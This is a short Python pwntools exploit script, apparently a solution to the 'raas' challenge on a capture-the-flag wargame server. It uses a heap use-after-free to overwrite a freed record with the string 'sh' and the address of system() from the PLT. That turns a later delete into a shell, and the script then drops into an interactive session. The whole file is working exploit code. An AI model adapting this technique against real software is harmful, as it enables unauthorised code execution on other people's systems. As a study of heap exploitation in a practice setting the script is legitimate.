#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug" 
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

def debug():
    raw_input("DEBUG: ")
    gdb.attach(io, "set follow-fork-mode parent\nb *main")


if sys.argv[1] == "r":
    io = remote("hackme.inndy.tw", 7719)
    elf = ELF("./raas")
else:
    io = process("./raas")
    elf = ELF("./raas")
    debug()

def New(idx, kind, value, length = 0):
    io.sendlineafter("Act > ", "1")
    io.sendlineafter("Index > ", str(idx))
    io.sendlineafter("Type > ", str(kind))
    if kind == 2:
        io.sendlineafter("Length > ", str(length))
        io.sendlineafter("Value > ", value)
        
    else:
        io.sendlineafter("Value > ", str(value))

def Del(idx):
    io.sendlineafter("Act > ", "2")
    io.sendlineafter("Index > ", str(idx))

def Show(idx):
    io.sendlineafter("Act > ", "3")
    io.sendlineafter("Index > ", str(idx))

def uaf():
    New(0, 1, 0x1000)
    New(1, 1, 0x2000)

    Del(0)
    Del(1)

    New(2, 2, ("sh\x00\x00" + p32(elf.plt["system"])), 10)
    #  New(3, 2, ("sh\x00\x00" + p32(elf.plt["system"])), 10)

    Del(0)

if __name__ == "__main__":
    uaf()
    io.interactive()
    io.close()
